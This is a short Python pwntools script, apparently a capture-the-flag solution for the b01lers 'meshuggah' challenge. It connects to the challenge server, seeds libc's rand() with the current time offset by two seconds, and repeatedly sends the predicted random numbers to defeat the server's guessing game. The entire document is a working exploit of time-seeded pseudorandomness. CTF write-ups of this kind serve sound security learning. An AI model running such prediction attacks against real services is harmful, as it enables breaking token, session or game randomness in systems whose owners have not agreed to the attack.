import ctypes
from pwn import *
import time

libc = ctypes.CDLL('libc.so.6')

p = remote("pwn.ctf.b01lers.com",1003)
#p = process("./meshuggah")

t = libc.time(None)
libc.srand(t+2)
print libc.rand()
print libc.rand()
print libc.rand()
			
print p.recvuntil('?')		

while True:			
	p.sendline(str(libc.rand()))
	print p.readline()

